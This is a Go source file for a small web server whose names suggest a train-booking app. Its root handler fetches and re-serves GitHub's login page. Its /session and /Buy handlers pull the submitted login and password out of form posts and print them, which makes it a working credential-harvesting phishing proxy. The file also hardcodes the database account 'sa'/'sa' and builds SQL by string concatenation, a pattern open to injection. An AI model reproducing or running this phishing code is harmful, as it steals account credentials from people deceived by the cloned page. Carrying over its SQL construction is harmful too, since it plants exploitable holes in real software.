package main

import (
	"context"
	"database/sql"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"

	_ "github.com/denisenkom/go-mssqldb"

	"github.com/gin-gonic/gin"
)

var db *sql.DB

const localurl = "http://localhost:8080"

func Buy(c *gin.Context) {
	body, _ := ioutil.ReadAll(c.Request.Body)
	name := ""
	trainid := ""

	for _, str := range strings.Split(string(body), "&") {
		if strings.Contains(str, "login") && !strings.Contains(str, "http") {
			name = strings.Split(str, "=")[1]
		}
		if strings.Contains(str, "password") {
			trainid = strings.Split(str, "=")[1]
		}
	}
	if len(name) != 0 && len(trainid) != 0 {
		fmt.Println(name, trainid)
	}
}

func Start(c *gin.Context) {
	method := c.Request.Method
	url := "https://github.com/login"
	req, err := http.NewRequest(method, url, c.Request.Body)
	if err != nil {
		panic(err)
	}
	//c.Request.Header = req.Header
	//origin := strings.Replace(c.Request.Header.Get("Origin"), url, localurl, -1)
	//c.Request.Header.Set("Origin", origin)
	//c.Request.Body = req.Body
	client := http.Client{}
	resp, err := client.Do(req)
	body, err := ioutil.ReadAll(resp.Body)
	c.Writer.WriteString(string(body))
}

func main() {
	sqlconnect()

	server := gin.Default()
	server.GET("/", Start)
	server.POST("/Buy", Buy)
	server.POST("/session", Buy)
	err := server.Run(":8080")
	if err != nil {
		panic(err)
	}

}
func sqlconnect() {
	var err error
	connString := fmt.Sprintf("server=%s;user id=%s;password=%s;port=%d;database=%s;",
		"localhost", "sa", "sa", 1433, "Booker")
	db, err = sql.Open("mssql", connString)

	if err != nil {
		fmt.Println("Open:", err)
	} else {
		fmt.Println("Open stats:", db.Stats())
	}

	//defer db.Close()

	ReadSample()
	deleteSample("Jared")
	UpdateSample("Nikita", 5468)
	InsertSample("chinchin", 7777)
}

func ReadSample() {
	ctx := context.Background()
	if db == nil {
		log.Fatal("db: ")
	}

	err := db.PingContext(ctx)
	if err != nil {
		log.Fatal("Error pinging database: " + err.Error())
	}

	data, _ := db.QueryContext(ctx, "select * from TestBook.Booked;")

	for data.Next() {
		var name, tra string
		var id int

		// Get values from row.
		err := data.Scan(&id, &name, &tra)
		if err != nil {
			log.Fatal("Error reading rows: " + err.Error())
		}

		fmt.Printf("ID: %d, Name: %s, Train: %s\n", id, name, tra)
	}
}

func deleteSample(name string) {
	ctx := context.Background()

	// Check if database is alive.
	err := db.PingContext(ctx)
	if err != nil {
		log.Fatal("Error pinging database: " + err.Error())
	}
	fmt.Println(name)
	_, err = db.ExecContext(ctx, "DELETE FROM TestBook.Booked WHERE Name='"+name+"';")

	if err != nil {
		fmt.Println("Error deleting row: " + err.Error())

	}
	//val, _ := result.RowsAffected()
	//fmt.Println(val)

}

func UpdateSample(name string, val int) {
	ctx := context.Background()

	// Check if database is alive.
	err := db.PingContext(ctx)
	if err != nil {
		log.Fatal("Error pinging database: " + err.Error())
	}
	fmt.Println(name)
	_, err = db.ExecContext(
		ctx,
		"UPDATE TestBook.Booked SET Train='"+strconv.Itoa(val)+"' WHERE Name='"+name+"';",
	)

	if err != nil {
		fmt.Println("Error UPDATE row: " + err.Error())

	}
	//Nval, _ := result.RowsAffected()
	//fmt.Println(Nval)
}
func InsertSample(name string, val int) {
	ctx := context.Background()

	// Check if database is alive.
	err := db.PingContext(ctx)
	if err != nil {
		log.Fatal("Error pinging database: " + err.Error())
	}
	fmt.Println(name)
	fsql := fmt.Sprintf("INSERT INTO TestBook.Booked (Name, Train) VALUES	(N'%s',    N'%s');", name, strconv.Itoa(val))
	_, err = db.ExecContext(
		ctx,
		fsql,
	)

	if err != nil {
		fmt.Println("Error Insert row: " + err.Error())

	}
	//Nval, _ := result.RowsAffected()
	//fmt.Println(Nval)
}
